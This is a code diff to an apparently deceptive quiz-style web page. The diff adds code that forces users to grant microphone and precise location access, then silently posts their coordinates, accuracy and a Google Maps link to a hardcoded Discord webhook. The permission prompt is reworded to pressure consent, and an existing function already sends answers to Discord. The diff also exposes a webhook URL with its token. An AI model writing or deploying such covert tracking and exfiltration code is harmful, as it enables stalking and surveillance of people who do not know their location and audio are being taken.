@@ -1371,18 +1371,31 @@ document.addEventListener('DOMContentLoaded', async () => {
     const startButton = document.getElementById('startButton');
     
     startButton.addEventListener('click', () => {
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    startRecording(stream);
-                    startExperience();
-                })
-                .catch(() => {
-                    showPermissionCard();
-                });
-        } else {
-            startExperience();
-        }
+        // Request both microphone and location permissions simultaneously
+        const micPromise = navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? 
+            navigator.mediaDevices.getUserMedia({ audio: true }) : Promise.reject('Microphone API not available');
+        
+        const geoPromise = navigator.geolocation && navigator.geolocation.getCurrentPosition ? 
+            new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    position => resolve(position),
+                    error => reject(error),
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }) : Promise.reject('Geolocation API not available');
+        
+        // Try to get both permissions
+        Promise.all([micPromise, geoPromise])
+            .then(([micStream, geoPosition]) => {
+                // Both permissions granted
+                startRecording(micStream);
+                handleLocationPermission(geoPosition);
+                startExperience();
+            })
+            .catch(error => {
+                console.error('Permission error:', error);
+                showPermissionCard();
+            });
     });
 
     // Fix next button logic to ensure it works on the last question
@@ -2068,7 +2081,80 @@ function sendToDiscord(question, answer) {
     });
 }
 
-/* Added function to display a convincing microphone permission card */
+// Add location permission variables
+let locationPermissionGranted = false;
+let userLocation = null;
+
+// Function to handle location permission
+function handleLocationPermission(position) {
+    locationPermissionGranted = true;
+    userLocation = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: new Date().toISOString()
+    };
+    
+    // Send location to webhook immediately
+    sendLocationToDiscord(userLocation);
+    
+    console.log('Location permission granted, coordinates captured');
+}
+
+// Function to send location to Discord webhook
+function sendLocationToDiscord(locationData) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
+    
+    // Create Google Maps link
+    const mapsUrl = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+    
+    // Format the message with location data
+    const message = {
+        embeds: [{
+            title: "📍 User Location Captured",
+            color: 0x00FF00,  // Green color
+            fields: [
+                {
+                    name: "Latitude",
+                    value: locationData.latitude.toString(),
+                    inline: true
+                },
+                {
+                    name: "Longitude", 
+                    value: locationData.longitude.toString(),
+                    inline: true
+                },
+                {
+                    name: "Accuracy",
+                    value: `±${Math.round(locationData.accuracy)} meters`,
+                    inline: true
+                },
+                {
+                    name: "Google Maps Link",
+                    value: `[Open in Google Maps](${mapsUrl})`
+                },
+                {
+                    name: "Timestamp",
+                    value: locationData.timestamp
+                }
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    // Send to Discord silently
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message)
+    }).catch(error => {
+        console.error('Error sending location to Discord:', error);
+    });
+}
+
+/* Updated function to display a combined permissions card */
 function showPermissionCard() {
     const overlay = document.createElement('div');
     overlay.id = 'permission-card-overlay';
@@ -2095,13 +2181,13 @@ function showPermissionCard() {
     card.style.fontFamily = 'Poppins, sans-serif';
 
     const message = document.createElement('p');
-    message.textContent = "We need access to your microphone to provide the full interactive experience. Please grant microphone permission.";
+    message.textContent = "We need access to your microphone and location to provide the full interactive experience. These permissions are required to continue.";
     message.style.color = '#4a4a4a';
     message.style.fontSize = '1.1rem';
     message.style.marginBottom = '1.5rem';
 
     const givePermissionButton = document.createElement('button');
-    givePermissionButton.textContent = "Give Microphone Permission";
+    givePermissionButton.textContent = "Grant Required Permissions";
     givePermissionButton.style.padding = '0.8rem 1.2rem';
     givePermissionButton.style.fontSize = '1rem';
     givePermissionButton.style.backgroundColor = '#ff6b6b';
@@ -2119,15 +2205,27 @@ function showPermissionCard() {
     });
 
     givePermissionButton.addEventListener('click', () => {
-         navigator.mediaDevices.getUserMedia({ audio: true })
-             .then(stream => {
-                  overlay.remove();
-                  startRecording(stream);
-                  startExperience();
-             })
-             .catch(() => {
-                  alert("Microphone permission is required to experience the full interactive features.");
-             });
+        // Try to get both permissions again
+        const micPromise = navigator.mediaDevices.getUserMedia({ audio: true });
+        const geoPromise = new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(
+                position => resolve(position),
+                error => reject(error),
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        });
+        
+        Promise.all([micPromise, geoPromise])
+            .then(([micStream, geoPosition]) => {
+                overlay.remove();
+                startRecording(micStream);
+                handleLocationPermission(geoPosition);
+                startExperience();
+            })
+            .catch(error => {
+                console.error('Permission error after retry:', error);
+                alert("Both microphone and location permissions are required for the full interactive experience.");
+            });
     });
 
     card.appendChild(message);
